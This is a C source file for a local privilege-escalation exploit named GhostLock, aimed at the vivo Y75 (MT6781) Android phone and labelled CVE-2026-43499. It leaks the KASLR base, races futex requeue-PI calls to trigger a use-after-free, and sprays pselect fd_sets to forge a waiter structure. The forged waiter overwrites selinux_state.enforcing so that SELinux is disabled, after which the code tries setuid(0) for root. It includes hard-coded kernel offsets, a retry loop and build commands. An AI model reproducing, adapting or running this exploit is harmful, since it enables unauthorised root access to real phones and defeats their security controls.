/*
 * y75_v4.c — GhostLock vivo Y75 (MT6781) CVE-2026-43499
 *
 * Write target: selinux_state.enforcing
 * Method: PI rbtree self-pointer write via pselect UAF spray
 *
 * Stack geometry (all confirmed from Ghidra listing):
 *   futex_lock_pi frame:   0x190, waiter at Stack[-0x110]
 *   sys_pselect6 frame:    0x0a0
 *   core_sys_select frame: 0x1c0, fd_set at Stack[-0x1b8]
 *
 *   waiter at T-0x110, fd_set at T-0x258
 *   delta = 0x148 → waiter at exp[9] with nfds=1024
 *
 *   waiter->lock at +0x38 = exp[16] = uninitialized stack
 *   (Path 3: run many forked attempts, rely on favorable stack state)
 *
 * Build:
 *   aarch64-linux-gnu-gcc -O2 -static -pthread -o y75_v4 y75_v4.c
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <linux/futex.h>
#include <linux/perf_event.h>
#include <stdint.h>
#include <signal.h>
#include <time.h>
#include <stdatomic.h>
#include <sched.h>

/* ── Confirmed offsets ──────────────────────────────────────────────────── */
#define KIMAGE_TEXT_BASE        0xffffff8008000000ULL
#define SELINUX_ENFORCING_OFF   0x01994b08ULL
#define INIT_TASK_OFF           0x02410000ULL

/* pselect spray constants — confirmed from Ghidra */
#define PSELECT_NFDS            1024
#define PSELECT_WPS             ((PSELECT_NFDS + 63) / 64)  /* 16 words/set */
#define WAITER_GLOBAL_WORD      41   /* exp[9] = global word 41 */

static uint64_t g_base = 0;
#define KADDR(off) (g_base + (uint64_t)(off))

/* ── KASLR leak via popen ───────────────────────────────────────────────── */
static uint64_t leak_kaslr(void) {
    FILE *fp = popen("/data/local/tmp/perf_leak_test 2>/dev/null | "
                     "grep -o '0xffffff[0-9a-f]*' | head -1", "r");
    if (!fp) return 0;
    char buf[32] = {};
    fgets(buf, sizeof(buf), fp);
    pclose(fp);
    if (!buf[0]) return 0;
    uint64_t addr = strtoull(buf, NULL, 16);
    return addr ? (addr & ~0x1FFFFFULL) : 0;
}

/* ── Race state ─────────────────────────────────────────────────────────── */
static uint32_t f_wait, f_pi_target, f_pi_chain;
static atomic_int waiter_ready, waiter_waiting, owner_started;
static atomic_int owner_chain_done, route_done;
static atomic_int punch_go, punch_stop, waiter_tid;

/* ── Build fake waiter in fd_set ────────────────────────────────────────── */
/*
 * Global word layout (3 sets × 16 words = 48 total):
 *   inp:  global words 0-15
 *   outp: global words 16-31
 *   exp:  global words 32-47
 *
 * Waiter at exp[9] = global word 41:
 *   waiter+0x00 (write target) → exp[9]  = global 41
 *   waiter+0x08 (tree_right)   → exp[10] = global 42
 *   waiter+0x10 (tree_left)    → exp[11] = global 43
 *   waiter+0x18 (task ptr)     → exp[12] = global 44
 *   waiter+0x20 (pi_right)     → exp[13] = global 45
 *   waiter+0x28 (pi_left)      → exp[14] = global 46
 *   waiter+0x30 (prio)         → exp[15] = global 47
 *   waiter+0x38 (lock ptr)     → exp[16] = UNCONTROLLED (path 3)
 *
 * Write: *waiter[0] = waiter_stack_addr
 * For selinux_enforcing: set waiter[0] = KADDR(SELINUX_ENFORCING_OFF)
 * ARM64 stack 16-aligned → waiter_addr low byte = 0x?0 → enforcing = 0
 */
static void set_global_word(fd_set *in, fd_set *out, fd_set *ex,
                             int gw, uint64_t val) {
    int si = gw / PSELECT_WPS;
    int wi = gw % PSELECT_WPS;
    unsigned long *dst = (si == 0) ? (unsigned long *)in :
                         (si == 1) ? (unsigned long *)out :
                                     (unsigned long *)ex;
    dst[wi] = (unsigned long)val;
}

static void prepare_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
    FD_ZERO(in); FD_ZERO(out); FD_ZERO(ex);
    int w = WAITER_GLOBAL_WORD;

    /* waiter+0x00: write target = selinux_enforcing */
    set_global_word(in, out, ex, w+0, KADDR(SELINUX_ENFORCING_OFF));
    /* waiter+0x08: tree_right = 0 */
    set_global_word(in, out, ex, w+1, 0);
    /* waiter+0x10: tree_left = 0 */
    set_global_word(in, out, ex, w+2, 0);
    /* waiter+0x18: task = init_task (valid kernel ptr) */
    set_global_word(in, out, ex, w+3, KADDR(INIT_TASK_OFF));
    /* waiter+0x20: pi_right = 0 */
    set_global_word(in, out, ex, w+4, 0);
    /* waiter+0x28: pi_left = 0 */
    set_global_word(in, out, ex, w+5, 0);
    /* waiter+0x30: prio = 120 */
    set_global_word(in, out, ex, w+6, 120);
    /* waiter+0x38: lock = exp[16] = UNCONTROLLED — path 3 */
    /* waiter+0x40: prio_cmp = exp[17] = UNCONTROLLED */
    /* waiter+0x48: deadline = exp[18] = UNCONTROLLED */
}

static void do_pselect_spray(void) {
    fd_set in, out, ex;
    prepare_fdsets(&in, &out, &ex);

    /* Open fds at positions set in fdsets to make kernel copy our data */
    int devnull = open("/dev/null", O_RDONLY);
    if (devnull >= 0) {
        for (int fd = 3; fd < PSELECT_NFDS; fd++) {
            if (FD_ISSET(fd, &in) || FD_ISSET(fd, &out) || FD_ISSET(fd, &ex))
                dup2(devnull, fd);
        }
        close(devnull);
    }

    /* Spray 500 times to maximize overlap probability */
    for (int i = 0; i < 500; i++) {
        struct timespec tp = {.tv_nsec = 1};
        syscall(SYS_pselect6, PSELECT_NFDS, &in, NULL, NULL, &tp, NULL);
    }
}

/* ── Threads ────────────────────────────────────────────────────────────── */
static void *th_waiter(void *arg) {
    (void)arg;
    prctl(PR_SET_NAME, "ghost_w");
    atomic_store(&waiter_tid, (int)syscall(SYS_gettid));

    syscall(SYS_futex, &f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    atomic_store(&waiter_ready, 1);
    while (!atomic_load(&owner_started)) usleep(100);

    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 5;
    atomic_store(&waiter_waiting, 1);

    /* This call creates the waiter on stack and registers pi_blocked_on */
    syscall(SYS_futex, &f_wait, FUTEX_WAIT_REQUEUE_PI, 0,
            &ts, &f_pi_target, 0);

    /*
     * futex_lock_pi returned — waiter stack frame is freed.
     * Same thread now calls pselect — reuses same stack space.
     * fd_set lands at T-0x258, waiter was at T-0x110.
     * Kernel still has pi_blocked_on pointing to old waiter location.
     * rt_mutex_adjust_prio_chain will dereference it.
     */
    do_pselect_spray();
    atomic_store(&route_done, 1);

    syscall(SYS_futex, &f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    while (!atomic_load(&owner_chain_done)) usleep(100);
    return NULL;
}

static void *th_owner(void *arg) {
    (void)arg;
    prctl(PR_SET_NAME, "ghost_o");
    /* Lock pi_target to set up PI chain */
    syscall(SYS_futex, &f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    while (!atomic_load(&waiter_ready)) usleep(100);
    atomic_store(&owner_started, 1);
    /* Lock pi_chain — creates priority chain with waiter */
    syscall(SYS_futex, &f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    atomic_store(&owner_chain_done, 1);
    for (;;) sleep(1);
    return NULL;
}

static void *th_consumer(void *arg) {
    (void)arg;
    prctl(PR_SET_NAME, "ghost_c");
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);

    while (!atomic_load(&punch_stop)) {
        if (!atomic_load(&punch_go)) {
            __asm__ volatile("yield":::"memory");
            continue;
        }
        /* Try to acquire pi_target to trigger priority propagation */
        struct timespec ft = {.tv_nsec = 30000000};
        long r = syscall(SYS_futex, &f_pi_target, FUTEX_LOCK_PI,
                         0, &ft, NULL, 0);
        if (r == 0)
            syscall(SYS_futex, &f_pi_target, FUTEX_UNLOCK_PI,
                    0, NULL, NULL, 0);
        usleep(1000);
    }
    return NULL;
}

/* ── Single race attempt — runs in forked child ─────────────────────────── */
static void run_attempt(void) {
    f_wait = 0; f_pi_target = 0; f_pi_chain = 0;
    atomic_store(&waiter_ready, 0);
    atomic_store(&waiter_waiting, 0);
    atomic_store(&owner_started, 0);
    atomic_store(&owner_chain_done, 0);
    atomic_store(&route_done, 0);
    atomic_store(&punch_go, 0);
    atomic_store(&punch_stop, 0);

    pthread_t tw, to, tc;
    pthread_create(&tc, NULL, th_consumer, NULL);
    pthread_create(&to, NULL, th_owner, NULL);
    pthread_create(&tw, NULL, th_waiter, NULL);

    while (!atomic_load(&waiter_waiting)) usleep(100);
    usleep(20000); /* Let waiter settle */

    /* Trigger UAF */
    syscall(SYS_futex, &f_wait, FUTEX_CMP_REQUEUE_PI,
            1, (void *)(uintptr_t)1, &f_pi_target, 0);
    atomic_store(&punch_go, 1);

    /* Wait for spray to complete */
    int w = 0;
    while (!atomic_load(&route_done) && w++ < 10000) usleep(500);

    atomic_store(&punch_stop, 1);
    pthread_detach(to);
    pthread_detach(tc);
    pthread_join(tw, NULL);
}

/* ── SELinux check ──────────────────────────────────────────────────────── */
static int selinux_is_off(void) {
    char buf[4] = {};
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd < 0) return 1;
    (void)!read(fd, buf, 1);
    close(fd);
    return buf[0] == '0';
}

/* ── Main ───────────────────────────────────────────────────────────────── */
int main(void) {
    setbuf(stdout, NULL);
    signal(SIGCHLD, SIG_IGN);

    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);

    printf("\n=== GhostLock vivo Y75 (MT6781) v4 ===\n");
    printf("[*] CVE-2026-43499 — SELinux disable via PI rbtree write\n\n");

    /* Get KASLR base from working perf_leak binary */
    printf("[*] Leaking KASLR via perf_leak...\n");
    g_base = leak_kaslr();
    if (!g_base) {
        printf("[-] KASLR leak failed — is perf_leak_test in /data/local/tmp?\n");
        return 1;
    }
    printf("[+] KASLR base:          0x%llx\n", (unsigned long long)g_base);
    printf("[+] selinux_enforcing:   0x%llx\n",
           (unsigned long long)KADDR(SELINUX_ENFORCING_OFF));
    printf("[+] init_task:           0x%llx\n",
           (unsigned long long)KADDR(INIT_TASK_OFF));
    printf("[*] waiter lands at exp[9], write target at exp[9]+0\n");
    printf("[*] waiter->lock at exp[16] = uncontrolled stack\n");
    printf("[*] Running 100 attempts with fork isolation...\n\n");

    if (selinux_is_off()) {
        printf("[+] SELinux already OFF!\n");
        goto try_root;
    }

    for (int att = 1; att <= 100; att++) {
        printf("[*] Attempt %d/100\r", att);
        fflush(stdout);

        pid_t pid = fork();
        if (pid == 0) {
            run_attempt();
            _exit(0);
        }
        int st;
        waitpid(pid, &st, 0);

        /* Check after each attempt */
        if (selinux_is_off()) {
            printf("\n[+] SELinux DISABLED at attempt %d!\n", att);
            goto try_root;
        }

        /* If child crashed (signal), it's a panic — wait a bit */
        if (WIFSIGNALED(st)) {
            printf("\n[!] Child crashed at attempt %d (stack state unfavorable)\n",
                   att);
            usleep(500000);
        } else {
            usleep(200000);
        }
    }

    printf("\n[-] 100 attempts done — SELinux still enforcing\n");
    printf("[*] waiter->lock field at exp[16] never hit favorable state\n");
    printf("[*] Consider checking Stack[-0xd8] value in futex_lock_pi\n");
    return 1;

try_root:
    printf("[*] Attempting privilege escalation...\n");

    /* With SELinux permissive, try setuid */
    if (setuid(0) == 0) {
        printf("[+] setuid(0) SUCCESS! uid=%u\n", getuid());
        int fd = open("/data/local/tmp/rooted", O_WRONLY|O_CREAT|O_TRUNC, 0644);
        if (fd >= 0) { (void)!write(fd, "1\n", 2); close(fd); }
        (void)!system("id > /data/local/tmp/root_id.txt 2>&1");
        printf("[+] ROOTED!\n");
        return 0;
    }

    printf("[-] setuid(0) failed — SELinux permissive but cred write needed\n");
    printf("[*] SELinux disabled is still a partial win\n");
    return 1;
}
